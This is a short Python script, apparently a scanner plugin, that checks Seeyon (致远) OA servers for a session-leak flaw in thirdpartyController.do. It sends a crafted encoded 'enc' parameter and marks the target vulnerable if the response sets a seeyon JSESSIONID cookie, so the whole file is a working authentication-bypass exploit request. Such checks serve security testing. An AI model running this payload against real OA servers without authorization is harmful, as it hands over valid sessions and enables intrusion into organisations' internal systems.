import requests,re
import urllib

def verify(url):
    relsult = {
        'name': '致远OA Session泄露(thirdpartyController.do)',
        'url': url,
        'vulnerable': False,
        'attack': True,
        'about': 'https://www.cnblogs.com/nul1/p/14749349.html, https://blog.csdn.net/maverickpig/article/details/118916085'
    }
    timeout = 3
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    payload = '/seeyon/thirdpartyController.do'
    data = 'method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1'
    vurl = urllib.parse.urljoin(url, payload)
    try:
        req = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if req.status_code == 200 and re.search('seeyon', req.headers['Set-Cookie']) and re.search('JSESSIONID', req.headers['Set-Cookie']):
            relsult['vulnerable'] = True
            relsult['vurl'] = vurl
        return relsult
    except:
        return relsult
